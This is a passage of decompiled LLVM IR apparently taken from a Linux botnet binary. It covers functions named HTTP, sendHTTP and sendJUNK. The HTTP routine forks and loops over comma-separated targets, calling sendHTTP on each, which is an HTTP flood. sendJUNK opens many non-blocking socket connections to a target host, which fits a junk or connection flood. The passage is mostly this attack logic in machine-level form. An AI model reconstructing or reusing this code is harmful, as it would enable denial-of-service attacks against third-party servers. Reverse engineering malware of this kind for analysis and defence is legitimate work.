  %v2_8050afc = call i32 @__GI_time(i32* null)
  %v5_8050b07 = icmp slt i32 %v2_8050afc, %v5_805094d
  br i1 %v5_8050b07, label %dec_label_pc_8050a91, label %dec_label_pc_8050b09

dec_label_pc_8050b09:                             ; preds = %dec_label_pc_8050af7
  %v1_8050b0e = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_8050b13:                             ; preds = %dec_label_pc_8050a82
  %v4_8050b13 = add nuw nsw i32 %storemerge61, 1
  %v5_8050b1c = icmp slt i32 %v4_8050b13, %arg6
  br i1 %v5_8050b1c, label %dec_label_pc_8050a82, label %dec_label_pc_8050b22

dec_label_pc_8050b22:                             ; preds = %dec_label_pc_8050a4f, %dec_label_pc_8050b13, %entry
  %v0_8050b28 = phi i32 [ %v1_8050a3c, %entry ], [ 0, %dec_label_pc_8050a4f ], [ %v4_8050b13, %dec_label_pc_8050b13 ]
  store i32 %v0_8050924, i32* @ebx, align 4
  ret i32 %v0_8050b28

; uselistorder directives
  uselistorder i32 %v4_8050b13, { 0, 2, 1 }
  uselistorder i32 %storemerge61, { 1, 0 }
  uselistorder i32 %v4_8050a42, { 1, 0 }
  uselistorder i8* %v3_80509bb, { 1, 0 }
  uselistorder i32 %v6_80509b4, { 0, 2, 1 }
  uselistorder i32 %v2_8050985, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_8050b22, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050af7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050a82, { 1, 0 }
}

define i32 @HTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8050b38 = call i32 @mfork(i32 %arg2)
  %v1_8050b40 = icmp eq i32 %v1_8050b38, 0
  %v1_8050b42 = icmp eq i1 %v1_8050b40, false
  br i1 %v1_8050b42, label %dec_label_pc_8050cf6, label %dec_label_pc_8050b48

dec_label_pc_8050b48:                             ; preds = %entry
  %v4_8050b48 = add i32 %arg3, -5
  %v9_8050b48 = sub i32 4, %arg3
  %v10_8050b48 = and i32 %v9_8050b48, %arg3
  %v11_8050b48 = icmp slt i32 %v10_8050b48, 0
  %v12_8050b48 = icmp eq i32 %v4_8050b48, 0
  %v13_8050b48 = icmp slt i32 %v4_8050b48, 0
  %v3_8050b4c = icmp eq i1 %v13_8050b48, %v11_8050b48
  %v4_8050b4c = icmp eq i1 %v12_8050b48, false
  %v5_8050b4c = and i1 %v4_8050b4c, %v3_8050b4c
  br i1 %v5_8050b4c, label %dec_label_pc_8050b64, label %dec_label_pc_8050b4e

dec_label_pc_8050b4e:                             ; preds = %dec_label_pc_8050b48
  %v2_8050b5c = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_806a294.298 to i32))
  br label %dec_label_pc_8050b64

dec_label_pc_8050b64:                             ; preds = %dec_label_pc_8050b48, %dec_label_pc_8050b4e
  %v1_8050b67 = add i32 %arg4, 24
  %v1_8050b6a = inttoptr i32 %v1_8050b67 to i32*
  %v2_8050b6a = load i32, i32* %v1_8050b6a, align 4
  %v1_8050b70 = call i32 @atol(i32 %v2_8050b6a)
  %v1_8050b7d = add i32 %arg4, 8
  %v1_8050b80 = inttoptr i32 %v1_8050b7d to i32*
  %v3_8050b92 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_806a2d4.299 to i32))
  %v1_8050b9d = add i32 %arg4, 4
  %v1_8050ba0 = inttoptr i32 %v1_8050b9d to i32*
  %v2_8050ba0 = load i32, i32* %v1_8050ba0, align 4
  %v2_8050ba8 = inttoptr i32 %v2_8050ba0 to i8*
  %v3_8050ba8 = call i32 @__GI_strchr(i8* %v2_8050ba8, i32 44)
  %v1_8050bb0 = icmp eq i32 %v3_8050ba8, 0
  br i1 %v1_8050bb0, label %dec_label_pc_8050c78, label %dec_label_pc_8050bb8

dec_label_pc_8050bb8:                             ; preds = %dec_label_pc_8050b64
  %v2_8050bbe = load i32, i32* %v1_8050ba0, align 4
  store i32 %v2_8050bbe, i32* @eax, align 4
  %v2_8050bc9 = call i32 @__GI_strtok(i32 %v2_8050bbe, i32 ptrtoint (i32* @global_var_80699fe.198 to i32))
  %v4_8050c6c31 = icmp eq i32 %v2_8050bc9, 0
  %v1_8050c7032 = icmp eq i1 %v4_8050c6c31, false
  br i1 %v1_8050c7032, label %dec_label_pc_8050bd9, label %dec_label_pc_8050cf6

dec_label_pc_8050bd9:                             ; preds = %dec_label_pc_8050bb8, %dec_label_pc_8050c57
  %storemerge1133 = phi i32 [ %v2_8050c61, %dec_label_pc_8050c57 ], [ %v2_8050bc9, %dec_label_pc_8050bb8 ]
  %v1_8050bd9 = call i32 @listFork(i32 %storemerge1133)
  store i32 %v1_8050bd9, i32* @eax, align 4
  %v1_8050bde = icmp eq i32 %v1_8050bd9, 0
  %v1_8050be0 = icmp eq i1 %v1_8050bde, false
  br i1 %v1_8050be0, label %dec_label_pc_8050c57, label %dec_label_pc_8050be2

dec_label_pc_8050be2:                             ; preds = %dec_label_pc_8050bd9
  %v2_8050be8 = load i32, i32* %v1_8050b6a, align 4
  %v1_8050bee = call i32 @atol(i32 %v2_8050be8)
  store i32 %v1_8050bee, i32* @ebx, align 4
  %v1_8050bfb = add i32 %arg4, 20
  %v1_8050bfe = inttoptr i32 %v1_8050bfb to i32*
  %v2_8050bfe = load i32, i32* %v1_8050bfe, align 4
  %v1_8050c04 = call i32 @atol(i32 %v2_8050bfe)
  store i32 %v1_8050c04, i32* @esi, align 4
  %v1_8050c11 = add i32 %arg4, 16
  %v1_8050c14 = inttoptr i32 %v1_8050c11 to i32*
  %v2_8050c14 = load i32, i32* %v1_8050c14, align 4
  store i32 %v2_8050c14, i32* @edi, align 4
  %v1_8050c19 = add i32 %arg4, 12
  %v1_8050c1c = inttoptr i32 %v1_8050c19 to i32*
  %v2_8050c1c = load i32, i32* %v1_8050c1c, align 4
  %v1_8050c22 = call i32 @atol(i32 %v2_8050c1c)
  %v2_8050c32 = load i32, i32* %v1_8050b80, align 4
  %v2_8050c3a = load i32, i32* %v1_8050ba0, align 4
  %v0_8050c3f = load i32, i32* @ebx, align 4
  %v0_8050c40 = load i32, i32* @esi, align 4
  %v0_8050c41 = load i32, i32* @edi, align 4
  %v5_8050c43 = inttoptr i32 %v2_8050c32 to i8*
  %v8_8050c45 = call i32 @sendHTTP(i32 %v2_8050c3a, i8* %v5_8050c43, i32 %v1_8050c22, i32 %v0_8050c41, i32 %v0_8050c40, i32 %v0_8050c3f)
  %v1_8050c52 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050c57:                             ; preds = %dec_label_pc_8050bd9
  %v2_8050c61 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80699fe.198 to i32))
  %v4_8050c6c = icmp eq i32 %v2_8050c61, 0
  %v1_8050c70 = icmp eq i1 %v4_8050c6c, false
  br i1 %v1_8050c70, label %dec_label_pc_8050bd9, label %dec_label_pc_8050cf6

dec_label_pc_8050c78:                             ; preds = %dec_label_pc_8050b64
  %v1_8050c78 = call i32 @listFork(i32 %tmp)
  %v1_8050c7d = icmp eq i32 %v1_8050c78, 0
  %v1_8050c7f = icmp eq i1 %v1_8050c7d, false
  br i1 %v1_8050c7f, label %dec_label_pc_8050cf6, label %dec_label_pc_8050c81

dec_label_pc_8050c81:                             ; preds = %dec_label_pc_8050c78
  %v2_8050c87 = load i32, i32* %v1_8050b6a, align 4
  %v1_8050c8d = call i32 @atol(i32 %v2_8050c87)
  store i32 %v1_8050c8d, i32* @ebx, align 4
  %v1_8050c9a = add i32 %arg4, 20
  %v1_8050c9d = inttoptr i32 %v1_8050c9a to i32*
  %v2_8050c9d = load i32, i32* %v1_8050c9d, align 4
  %v1_8050ca3 = call i32 @atol(i32 %v2_8050c9d)
  store i32 %v1_8050ca3, i32* @esi, align 4
  %v1_8050cb0 = add i32 %arg4, 16
  %v1_8050cb3 = inttoptr i32 %v1_8050cb0 to i32*
  %v2_8050cb3 = load i32, i32* %v1_8050cb3, align 4
  store i32 %v2_8050cb3, i32* @edi, align 4
  %v1_8050cb8 = add i32 %arg4, 12
  %v1_8050cbb = inttoptr i32 %v1_8050cb8 to i32*
  %v2_8050cbb = load i32, i32* %v1_8050cbb, align 4
  %v1_8050cc1 = call i32 @atol(i32 %v2_8050cbb)
  %v2_8050cd1 = load i32, i32* %v1_8050b80, align 4
  %v2_8050cd9 = load i32, i32* %v1_8050ba0, align 4
  %v0_8050cde = load i32, i32* @ebx, align 4
  %v0_8050cdf = load i32, i32* @esi, align 4
  %v0_8050ce0 = load i32, i32* @edi, align 4
  %v5_8050ce2 = inttoptr i32 %v2_8050cd1 to i8*
  %v8_8050ce4 = call i32 @sendHTTP(i32 %v2_8050cd9, i8* %v5_8050ce2, i32 %v1_8050cc1, i32 %v0_8050ce0, i32 %v0_8050cdf, i32 %v0_8050cde)
  %v1_8050cf1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050cf6:                             ; preds = %dec_label_pc_8050bb8, %dec_label_pc_8050c57, %dec_label_pc_8050c78, %entry
  %v0_8050cfd = phi i32 [ %v1_8050c78, %dec_label_pc_8050c78 ], [ %v1_8050b38, %entry ], [ %v2_8050bc9, %dec_label_pc_8050bb8 ], [ %v2_8050c61, %dec_label_pc_8050c57 ]
  ret i32 %v0_8050cfd

; uselistorder directives
  uselistorder i32 %v2_8050c61, { 0, 2, 1 }
  uselistorder i32* %v1_8050ba0, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8050b80, { 1, 0 }
  uselistorder i32* %v1_8050b6a, { 1, 0, 2 }
  uselistorder i32 %v4_8050b48, { 1, 0 }
  uselistorder i32 (i32)* @listFork, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80699fe.198 to i32), { 3, 0, 6, 7, 8, 4, 1, 5, 2 }
  uselistorder i32 %arg4, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050cf6, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8050bd9, { 1, 0 }
  uselistorder label %dec_label_pc_8050b64, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v12_8050d03 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_8050d03, i32* %eax.global-to-local, align 4
  %v1_8050d11 = call i32 @getdtablesize(i32 %v12_8050d03)
  store i32 %v1_8050d11, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_8050d11, 0
  %v2_8050d1a = zext i1 %tmp to i32
  %v2_8050d1d = add i32 %v2_8050d1a, %v1_8050d11
  %v2_8050d1f = sdiv i32 %v2_8050d1d, 2
  store i32 2, i32* %stack_var_-64, align 4
  %v1_8050d2d = urem i32 %arg2, 65536
  store i32 %v1_8050d2d, i32* %eax.global-to-local, align 4
  %v1_8050d36 = call i32 @htons(i32 %v1_8050d2d)
  %v2_8050d45 = ptrtoint i32* %stack_var_-64 to i32
  %v15_8050d48 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_8050d48, i32* %eax.global-to-local, align 4
  %v3_8050d4f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_8050d4f, i32* %eax.global-to-local, align 4
  %v1_8050d57 = icmp eq i32 %v3_8050d4f, 0
  br i1 %v1_8050d57, label %dec_label_pc_8050d60, label %dec_label_pc_80510bc

dec_label_pc_8050d60:                             ; preds = %entry
  %v15_8050d6a = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_8050d6a, i32* %eax.global-to-local, align 4
  %v3_8050d6e = bitcast i32* %stack_var_-56 to i8*
  %v4_8050d6e = call i32 @__GI_memset(i8* %v3_8050d6e, i32 0, i32 8)
  %v2_8050d79 = mul i32 %v2_8050d1f, 8
  %v1_8050d7f = add i32 %v2_8050d79, 30
  %v2_8050d82 = and i32 %v1_8050d7f, -16
  %v2_8050d88 = sub i32 %v12_8050d03, %v2_8050d82
  %v1_8050d96 = add i32 %v2_8050d88, 15
  %v2_8050d99 = and i32 %v1_8050d96, -16
  %v2_8050db6 = mul i32 %v2_8050d1f, 5
  store i32 %v2_8050db6, i32* %eax.global-to-local, align 4
  store i32 %v2_8050d99, i32* %edx.global-to-local, align 4
  %v2_8050dbe = add i32 %v2_8050d88, -8
  %v3_8050dbe = inttoptr i32 %v2_8050dbe to i32*
  store i32 %v2_8050db6, i32* %v3_8050dbe, align 4
  %v1_8050dbf = add i32 %v2_8050d88, -12
  %v2_8050dbf = inttoptr i32 %v1_8050dbf to i32*
  store i32 0, i32* %v2_8050dbf, align 4
  %v0_8050dc1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050dc1 = add i32 %v2_8050d88, -16
  %v3_8050dc1 = inttoptr i32 %v2_8050dc1 to i32*
  store i32 %v0_8050dc1, i32* %v3_8050dc1, align 4
  %v3_8050dc2 = inttoptr i32 %v2_8050d99 to i8*
  %v4_8050dc2 = call i32 @__GI_memset(i8* %v3_8050dc2, i32 %tmp7, i32 %v12_8050d03)
  store i32 %v4_8050dc2, i32* %eax.global-to-local, align 4
  %v0_8050dc7 = load i32, i32* @esp, align 4
  %v2_8050dcd = inttoptr i32 %v0_8050dc7 to i32*
  store i32 1024, i32* %v2_8050dcd, align 4
  %v1_8050dd2 = call i32 @malloc(i32 %v2_8050d99)
  store i32 %v1_8050dd2, i32* %eax.global-to-local, align 4
  %v0_8050dd7 = load i32, i32* @esp, align 4
  %v1_8050de0 = add i32 %v0_8050dd7, 8
  %v2_8050de0 = inttoptr i32 %v1_8050de0 to i32*
  store i32 1024, i32* %v2_8050de0, align 4
  %v1_8050de5 = add i32 %v0_8050dd7, 4
  %v2_8050de5 = inttoptr i32 %v1_8050de5 to i32*
  store i32 0, i32* %v2_8050de5, align 4
  %v6_8050de7 = inttoptr i32 %v0_8050dd7 to i32*
  store i32 %v1_8050dd2, i32* %v6_8050de7, align 4
  %v3_8050dea = inttoptr i32 %v1_8050dd2 to i8*
  %v4_8050dea = call i32 @__GI_memset(i8* %v3_8050dea, i32 %tmp11, i32 %tmp9)
  store i32 %v4_8050dea, i32* %eax.global-to-local, align 4
  %v0_8050def = load i32, i32* @esp, align 4
  %v2_8050dfc = inttoptr i32 %v0_8050def to i32*
  store i32 0, i32* %v2_8050dfc, align 4
  %v2_8050dfe = call i32 @__GI_time(i32* inttoptr (i32 1024 to i32*))
  %v0_8050e03 = load i32, i32* @esp, align 4
  %v1_8050e03 = add i32 %v0_8050e03, 16
  %v5_8050e06 = add i32 %v2_8050dfe, %arg3
  store i32 %v5_8050e06, i32* %eax.global-to-local, align 4
  %v3_8050e23 = or i32 %v2_8050d99, 4
  %v2_8050f0e = ptrtoint i32* %stack_var_-192 to i32
  %tmp36 = bitcast i32* %stack_var_-192 to i8*
  %v2_8050f62 = ptrtoint i32* %stack_var_-200 to i32
  %v2_8050f9c = ptrtoint i32* %stack_var_-204 to i32
  %v2_8050fa3 = ptrtoint i32* %stack_var_-208 to i32
  %v5_80510a043 = icmp sgt i32 %v2_8050d1d, 1
  br label %dec_label_pc_80510a6

dec_label_pc_8050e1d:                             ; preds = %dec_label_pc_805109a.preheader, %dec_label_pc_8051097
  %storemerge46 = phi i32 [ %v4_8051097, %dec_label_pc_8051097 ], [ 0, %dec_label_pc_805109a.preheader ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.0, %dec_label_pc_8051097 ], [ %stack_var_-20.2, %dec_label_pc_805109a.preheader ]
  %stack_var_-16.144 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8051097 ], [ %stack_var_-16.2, %dec_label_pc_805109a.preheader ]
  store i32 %storemerge46, i32* %eax.global-to-local, align 4
  store i32 %v2_8050d99, i32* %edx.global-to-local, align 4
  %v2_8050e23 = mul i32 %storemerge46, 8
  %v4_8050e23 = add i32 %v2_8050e23, %v3_8050e23
  %v5_8050e23 = inttoptr i32 %v4_8050e23 to i8*
  %v6_8050e23 = load i8, i8* %v5_8050e23, align 4
  %v7_8050e23 = zext i8 %v6_8050e23 to i32
  %v9_8050e23 = and i32 %storemerge46, -256
  %v10_8050e23 = or i32 %v7_8050e23, %v9_8050e23
  store i32 %v10_8050e23, i32* %eax.global-to-local, align 4
  store i32 %v7_8050e23, i32* %edx.global-to-local, align 4
  %v8_8050e34 = icmp eq i8 %v6_8050e23, 0
  %v12_8050e34 = icmp eq i8 %v6_8050e23, 1
  br i1 %v12_8050e34, label %dec_label_pc_8050f04, label %dec_label_pc_8050e41

dec_label_pc_8050e41:                             ; preds = %dec_label_pc_8050e1d
  %v12_8050e41 = icmp eq i8 %v6_8050e23, 2
  br i1 %v12_8050e41, label %dec_label_pc_8051022, label %dec_label_pc_8050e4e

dec_label_pc_8050e4e:                             ; preds = %dec_label_pc_8050e41
  br i1 %v8_8050e34, label %dec_label_pc_8050e5c, label %dec_label_pc_8051097

dec_label_pc_8050e5c:                             ; preds = %dec_label_pc_8050e4e
  store i32 %storemerge46, i32* @ebx, align 4
  %v0_8050e5f = load i32, i32* @esp, align 4
  %v1_8050e62 = add i32 %v0_8050e5f, -8
  %v2_8050e62 = inttoptr i32 %v1_8050e62 to i32*
  store i32 0, i32* %v2_8050e62, align 4
  %v1_8050e64 = add i32 %v0_8050e5f, -12
  %v2_8050e64 = inttoptr i32 %v1_8050e64 to i32*
  store i32 1, i32* %v2_8050e64, align 4
  %v1_8050e66 = add i32 %v0_8050e5f, -16
  %v2_8050e66 = inttoptr i32 %v1_8050e66 to i32*
  store i32 2, i32* %v2_8050e66, align 4
  %v3_8050e68 = call i32 @socket(i32 %v7_8050e23, i32 %v12_8050d03, i32 ptrtoint (i32* @0 to i32))
  %v2_8050e75 = load i32, i32* @ebx, align 4
  %v3_8050e75 = mul i32 %v2_8050e75, 8
  %v4_8050e75 = add i32 %v3_8050e75, %v2_8050d99
  %v5_8050e75 = inttoptr i32 %v4_8050e75 to i32*
  store i32 %v3_8050e68, i32* %v5_8050e75, align 8
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v3_8050e7e = add i32 %v2_8050e23, %v2_8050d99
  %v4_8050e7e = inttoptr i32 %v3_8050e7e to i32*
  %v5_8050e7e = load i32, i32* %v4_8050e7e, align 8
  store i32 %v5_8050e7e, i32* %eax.global-to-local, align 4
  %v0_8050e81 = load i32, i32* @esp, align 4
  %v1_8050e84 = add i32 %v0_8050e81, -8
  %v2_8050e84 = inttoptr i32 %v1_8050e84 to i32*
  store i32 0, i32* %v2_8050e84, align 4
  %v1_8050e86 = add i32 %v0_8050e81, -12
  %v2_8050e86 = inttoptr i32 %v1_8050e86 to i32*
  store i32 3, i32* %v2_8050e86, align 4
  %v0_8050e88 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e88 = add i32 %v0_8050e81, -16
  %v3_8050e88 = inttoptr i32 %v2_8050e88 to i32*
  store i32 %v0_8050e88, i32* %v3_8050e88, align 4
  %v3_8050e89 = call i32 @fcntl(i32 %v7_8050e23, i32 %v12_8050d03, i32 ptrtoint (i32* @0 to i32))
  %v0_8050e8e = load i32, i32* @esp, align 4
  %v12_8050e93 = or i32 %v3_8050e89, 2048
  store i32 %v12_8050e93, i32* @ecx, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v5_8050e9c = load i32, i32* %v4_8050e7e, align 8
  store i32 %v5_8050e9c, i32* %eax.global-to-local, align 4
  %v2_8050ea2 = add i32 %v0_8050e8e, 8
  %v3_8050ea2 = inttoptr i32 %v2_8050ea2 to i32*
  store i32 %v12_8050e93, i32* %v3_8050ea2, align 4
  %v1_8050ea3 = add i32 %v0_8050e8e, 4
  %v2_8050ea3 = inttoptr i32 %v1_8050ea3 to i32*
  store i32 4, i32* %v2_8050ea3, align 4
  %v0_8050ea5 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050ea5 = inttoptr i32 %v0_8050e8e to i32*
  store i32 %v0_8050ea5, i32* %v3_8050ea5, align 4
  %v3_8050ea6 = call i32 @fcntl(i32 %v7_8050e23, i32 %v12_8050d03, i32 ptrtoint (i32* @0 to i32))
  %v0_8050eab = load i32, i32* @esp, align 4
  store i32 %v2_8050d45, i32* @ecx, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v5_8050eb7 = load i32, i32* %v4_8050e7e, align 8
  store i32 %v5_8050eb7, i32* %eax.global-to-local, align 4
  %v1_8050ebd = add i32 %v0_8050eab, 8
  %v2_8050ebd = inttoptr i32 %v1_8050ebd to i32*
  store i32 16, i32* %v2_8050ebd, align 4
  %v2_8050ebf = add i32 %v0_8050eab, 4
  %v3_8050ebf = inttoptr i32 %v2_8050ebf to i32*
  store i32 %v2_8050d45, i32* %v3_8050ebf, align 4
  %v0_8050ec0 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050ec0 = inttoptr i32 %v0_8050eab to i32*
  store i32 %v0_8050ec0, i32* %v3_8050ec0, align 4
  %v3_8050ec1 = call i32 @connect(i32 %v7_8050e23, i32 %v12_8050d03, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050ec1, i32* %eax.global-to-local, align 4
  %v0_8050ec6 = load i32, i32* @esp, align 4
  %v1_8050ec6 = add i32 %v0_8050ec6, 16
  %v10_8050ec9 = icmp eq i32 %v3_8050ec1, -1
  %v1_8050ecc = icmp eq i1 %v10_8050ec9, false
  br i1 %v1_8050ecc, label %dec_label_pc_8050eda, label %dec_label_pc_8050ece

dec_label_pc_8050ece:                             ; preds = %dec_label_pc_8050e5c
  %v1_8050ece = call i32 @__errno_location(i32 %v7_8050e23)
  store i32 %v1_8050ece, i32* %eax.global-to-local, align 4
  %v1_8050ed3 = inttoptr i32 %v1_8050ece to i32*
  %v2_8050ed3 = load i32, i32* %v1_8050ed3, align 4
  store i32 %v2_8050ed3, i32* %eax.global-to-local, align 4
  %v9_8050ed5 = icmp eq i32 %v2_8050ed3, 115
  br i1 %v9_8050ed5, label %dec_label_pc_8050ef4, label %dec_label_pc_8050ece.dec_label_pc_8050eda_crit_edge

dec_label_pc_8050ece.dec_label_pc_8050eda_crit_edge: ; preds = %dec_label_pc_8050ece
  %v0_8050ee3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050eda

dec_label_pc_8050eda:                             ; preds = %dec_label_pc_8050ece.dec_label_pc_8050eda_crit_edge, %dec_label_pc_8050e5c
  %v0_8050ee3 = phi i32 [ %v0_8050ee3.pre, %dec_label_pc_8050ece.dec_label_pc_8050eda_crit_edge ], [ %v1_8050ec6, %dec_label_pc_8050e5c ]
  store i32 %storemerge46, i32* %eax.global-to-local, align 4
  store i32 %v2_8050d99, i32* %edx.global-to-local, align 4
  %v5_8050ee0 = load i32, i32* %v4_8050e7e, align 8
  store i32 %v5_8050ee0, i32* %eax.global-to-local, align 4
  %v2_8050ee6 = add i32 %v0_8050ee3, -16
  %v3_8050ee6 = inttoptr i32 %v2_8050ee6 to i32*
  store i32 %v5_8050ee0, i32* %v3_8050ee6, align 4
  %v1_8050ee7 = call i32 @close(i32 %v7_8050e23)
  store i32 %v1_8050ee7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051097

dec_label_pc_8050ef4:                             ; preds = %dec_label_pc_8050ece
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_8050e23, align 4
  br label %dec_label_pc_8051097

dec_label_pc_8050f04:                             ; preds = %dec_label_pc_8050e1d
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f0e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8050f15 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v6_8050f15 = ptrtoint i8* %v5_8050f15 to i32
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v3_8050f23 = add i32 %v2_8050e23, %v2_8050d99
  %v4_8050f23 = inttoptr i32 %v3_8050f23 to i32*
  %v5_8050f23 = load i32, i32* %v4_8050f23, align 8
  %v2_8050f28 = udiv i32 %v5_8050f23, 32
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v5_8050f31 = load i32, i32* %v4_8050f23, align 8
  %v1_8050f34 = urem i32 %v5_8050f31, 32
  store i32 %v1_8050f34, i32* %eax.global-to-local, align 4
  %v0_8050f37 = load i32, i32* @ebp, align 4
  %v2_8050f37 = mul nuw nsw i32 %v2_8050f28, 4
  %v3_8050f37 = add nsw i32 %v2_8050f37, -188
  %v4_8050f37 = add i32 %v3_8050f37, %v0_8050f37
  %v5_8050f37 = inttoptr i32 %v4_8050f37 to i32*
  %v6_8050f37 = load i32, i32* %v5_8050f37, align 4
  %v9_8050f37 = shl i32 1, %v1_8050f34
  %v12_8050f37 = or i32 %v6_8050f37, %v9_8050f37
  store i32 %v12_8050f37, i32* %v5_8050f37, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v5_8050f59 = load i32, i32* %v4_8050f23, align 8
  %v1_8050f5c = add i32 %v5_8050f59, 1
  store i32 %v1_8050f5c, i32* %edx.global-to-local, align 4
  %v0_8050f5f = load i32, i32* @esp, align 4
  %v2_8050f68 = add i32 %v0_8050f5f, -16
  %v3_8050f68 = inttoptr i32 %v2_8050f68 to i32*
  store i32 %v2_8050f62, i32* %v3_8050f68, align 4
  %v1_8050f69 = add i32 %v0_8050f5f, -20
  %v2_8050f69 = inttoptr i32 %v1_8050f69 to i32*
  store i32 0, i32* %v2_8050f69, align 4
  store i32 %v2_8050f0e, i32* %eax.global-to-local, align 4
  %v2_8050f71 = add i32 %v0_8050f5f, -24
  %v3_8050f71 = inttoptr i32 %v2_8050f71 to i32*
  store i32 %v2_8050f0e, i32* %v3_8050f71, align 4
  %v1_8050f72 = add i32 %v0_8050f5f, -28
  %v2_8050f72 = inttoptr i32 %v1_8050f72 to i32*
  store i32 0, i32* %v2_8050f72, align 4
  %v0_8050f74 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050f74 = add i32 %v0_8050f5f, -32
  %v3_8050f74 = inttoptr i32 %v2_8050f74 to i32*
  store i32 %v0_8050f74, i32* %v3_8050f74, align 4
  %v0_8050f75 = load i32, i32* %stack_var_-200, align 4
  %v2_8050f75 = load i32, i32* %stack_var_-192, align 4
  %v5_8050f75 = call i32 @__libc_select(i32 %v0_8050f75, i32 10000, i32 %v2_8050f75, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050f75, i32* %eax.global-to-local, align 4
  %v0_8050f7a = load i32, i32* @esp, align 4
  %v12_8050f80 = icmp eq i32 %v5_8050f75, 1
  %v1_8050f84 = icmp eq i1 %v12_8050f80, false
  br i1 %v1_8050f84, label %dec_label_pc_8050ff6, label %dec_label_pc_8050f86

dec_label_pc_8050f86:                             ; preds = %dec_label_pc_8050f04
  store i32 4, i32* %stack_var_-204, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_8050d99, i32* %eax.global-to-local, align 4
  %v5_8050f96 = load i32, i32* %v4_8050f23, align 8
  store i32 %v5_8050f96, i32* %edx.global-to-local, align 4
  %v2_8050fa2 = add i32 %v0_8050f7a, 16
  %v3_8050fa2 = inttoptr i32 %v2_8050fa2 to i32*
  store i32 %v2_8050f9c, i32* %v3_8050fa2, align 4
  store i32 %v2_8050fa3, i32* %eax.global-to-local, align 4
  %v2_8050fa9 = add i32 %v0_8050f7a, 12
  %v3_8050fa9 = inttoptr i32 %v2_8050fa9 to i32*
  store i32 %v2_8050fa3, i32* %v3_8050fa9, align 4
  %v1_8050faa = add i32 %v0_8050f7a, 8
  %v2_8050faa = inttoptr i32 %v1_8050faa to i32*
  store i32 4, i32* %v2_8050faa, align 4
  %v1_8050fac = add i32 %v0_8050f7a, 4
  %v2_8050fac = inttoptr i32 %v1_8050fac to i32*
  store i32 1, i32* %v2_8050fac, align 4
  %v0_8050fae = load i32, i32* %edx.global-to-local, align 4
  %v3_8050fae = inttoptr i32 %v0_8050f7a to i32*
  store i32 %v0_8050fae, i32* %v3_8050fae, align 4
  %v0_8050faf = load i32, i32* %stack_var_-204, align 4
  %v1_8050faf = call i32 @getsockopt(i32 %v0_8050faf)
  %v0_8050fb4 = load i32, i32* @esp, align 4
  %v3_8050fb7 = load i32, i32* %stack_var_-208, align 4
  %v1_8050fbd = icmp eq i32 %v3_8050fb7, 0
